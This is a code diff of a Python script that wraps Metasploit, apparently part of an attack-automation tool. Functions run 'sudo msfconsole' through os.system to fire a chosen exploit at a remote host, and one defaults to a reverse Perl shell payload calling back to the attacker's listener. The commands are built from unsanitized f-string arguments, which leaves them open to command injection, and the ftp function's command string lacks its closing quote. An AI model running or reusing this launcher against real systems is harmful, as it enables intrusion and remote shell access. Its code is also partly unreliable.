@@ -3,10 +3,16 @@ import os
 import time
 
 def metasploit(exploit:str, rhost:str, lhost:str):
-    # msfconsole -q -x " use exploit/multi/handler; set rhost $targetip;
-    # set lport $lport ; explot -j;"
+    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhost}; set lhost {lhost};run"')
 
-    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhost {rhost}; set lhost {lhost};run"')
+def ftp(exploit:str, rhosts:str):
+    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhosts};run')
+
+def other(exploit:str, rhost:str, lhost:str, payload:str="payload/cmd/unix/reverse_perl"):
+    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhost}; set lhost {lhost}; set payload {payload};run"')
+
+def igel(exploit:str, rhost:str, lhost:str, srvhost:str):
+    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhost}; set lhost {lhost};set srvhost {srvhost};run"')
 
 def sprint(text:str):
     print("\033[1;37m")
